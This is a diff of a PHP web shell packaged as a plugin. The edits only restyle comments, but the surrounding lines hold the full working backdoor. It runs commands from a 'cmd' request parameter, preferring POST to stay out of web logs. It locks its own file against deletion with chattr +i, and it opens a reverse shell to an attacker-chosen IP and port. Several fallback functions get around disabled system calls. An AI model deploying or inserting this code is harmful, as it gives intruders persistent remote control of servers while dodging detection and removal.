@@ -9,23 +9,24 @@
     Author URI: https://leonjza.github.io
 */
 
-# attempt to protect myself from deletion.
+// attempt to protect myself from deletion.
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i   $this_file");
 
-# name of the parameter (GET  or POST) for the command.
-# change this if the target already use this parameter.
+// name of the parameter (GET or POST) for the command.
+// change   this  if  the  target   already   use  this
+// parameter.
 $cmd = 'cmd';
 
+// test if  parameter 'cmd', 'ip or  'port' is present.
+// if not  this will avoid an  error on logs or  on all
+// pages if badly configured.
 
-# test if parameter 'cmd', 'ip or 'port' is present. If
-# not this will avoid an error  on logs or on all pages
-# if badly configured.
 if (isset($_REQUEST[$cmd])) {
-   # grab the command we want to run from the 'cmd' get
-   # or post parameter (post  don't display the command
-   # on apache logs)
+   // grab the  command we want  to run from  the 'cmd'
+   // get  or post  parameter (post  don't display  the
+   // command on apache logs)
    $command = $_REQUEST[$cmd];
    executeCommand($command);
    die();
@@ -34,14 +35,14 @@ if (isset($_REQUEST[$cmd])) {
 if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
    $ip = $_REQUEST[$ip];
 
-   # default port 443
+   // default port 443
    $port = '443';
 
    if (isset($_REQUEST[$port])) {
       $port = $_REQUEST[$port];
    }
 
-   # nc -nlvp 443
+   // nc -nlvp 443
    $sock    = fsockopen($ip, $port);
    $command = '/bin/sh -i <&3 >&3 2>&3';
 
@@ -52,30 +53,30 @@ die();
 
 function executeCommand(string $command)
 {
-   # try to find a way to run our command using various
-   # php internals.
+   // try  to  find a  way  to  run our  command  using
+   // various php internals.
 
    if (class_exists('ReflectionFunction')) {
-      # http://php.net/manual/en/class.reflectionfunction.php
+      // http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);
       return;
    }
 
    if (function_exists('call_user_func_array')) {
-      # http://php.net/manual/en/function.call-user-func-array.php
+      // http://php.net/manual/en/function.call-user-func-array.php
       call_user_func_array('system', array($command));
       return;
    }
 
    if (function_exists('call_user_func')) {
-      # http://php.net/manual/en/function.call-user-func.php
+      // http://php.net/manual/en/function.call-user-func.php
       call_user_func('system', $command);
       return;
    }
 
    if (function_exists('passthru')) {
-      # https://www.php.net/manual/en/function.passthru.php
+      // https://www.php.net/manual/en/function.passthru.php
       ob_start();
       passthru($command, $return_var);
       $output = ob_get_contents();
@@ -84,10 +85,10 @@ function executeCommand(string $command)
    }
 
    if (function_exists('system')) {
-      # this  is  the  last  resort.  chances  are  php
-      # subhosting has system()  on a blacklist anyways
-      # :>
-      # http://php.net/manual/en/function.system.php
+      // this  is  the  last resort.  chances  are  php
+      // subhosting has system() on a blacklist anyways
+      // :>
+      // http://php.net/manual/en/function.system.php
       system($command);
       return;
    }
